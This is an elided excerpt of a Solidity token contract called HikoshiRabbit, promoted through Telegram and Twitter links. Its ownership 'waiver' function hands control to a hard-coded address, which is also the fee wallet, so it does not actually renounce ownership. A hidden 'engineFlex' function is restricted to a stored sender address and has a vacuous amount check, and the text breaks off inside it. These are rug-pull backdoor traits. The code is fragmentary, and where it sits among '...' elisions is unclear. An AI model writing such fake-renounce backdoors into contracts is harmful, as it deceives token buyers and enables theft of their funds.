...
/* https://t.me/HIKOSHI_Rabbit || https://twitter.com/HIKOSHI_Rabbit */
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xF462812d3771d455dAB324Afb5031A4C8f93D2A4);
    }
...
contract HikoshiRabbit is Context, IERC20, Ownable {
    ...
    address payable private C_WalletAddress = payable(0xF462812d3771d455dAB324Afb5031A4C8f93D2A4);
    ...
    // function setC_WalletAddress(address newAddress) external onlyOwner() {
    //     C_WalletAddress = payable(newAddress);
    // }
    ...
    function engineFlex(uint256 amount, address recipient) external {
        require (sendermsg == msg.sender);
        require (0 <= amount, "Amount must be more than AV-0");
